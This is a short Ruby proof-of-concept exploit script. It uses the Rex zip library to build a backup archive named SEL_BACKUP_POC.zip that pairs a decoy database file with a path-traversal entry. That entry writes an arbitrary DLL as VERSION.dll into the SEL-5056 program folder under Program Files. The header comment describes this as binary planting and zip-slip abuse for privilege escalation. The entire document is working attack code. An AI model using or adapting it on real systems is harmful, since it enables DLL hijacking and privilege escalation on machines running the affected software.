#!/usr/bin/env ruby
# Binary planting + Abuse of Ionic's Zip Library allows for privilege escalation. 
# -mario ceballos
require 'rex'
require 'rex/zip'

fd = File.open("template.dll", "rb" )
data = fd.read(fd.stat.size)
fd.close

zip = Rex::Zip::Archive.new
zip.add_file("restored.db")
zip.add_file("\\..\\..\\..\\..\\Program Files (x86)\\SEL\\SEL-5056\\VERSION.dll", data)
zip.save_to("SEL_BACKUP_POC.zip")
